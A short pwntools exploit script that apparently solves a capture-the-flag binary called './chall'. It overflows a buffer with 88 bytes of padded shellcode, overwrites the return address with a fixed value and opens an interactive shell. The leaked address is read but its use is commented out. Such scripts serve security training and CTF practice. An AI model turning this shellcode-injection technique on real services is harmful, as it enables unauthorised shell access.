from pwn import *

p = process('./chall')
elf = context.binary = ELF('./chall')

p.recvuntil(b"Gift : ")
base_addr = p64(int(p.recvline().strip()))

payload = asm(shellcraft.sh())
payload = payload.ljust(88,b"O")
#payload += base_addr
payload += p64(0x000000000000112f)
p.sendline(payload)


p.interactive()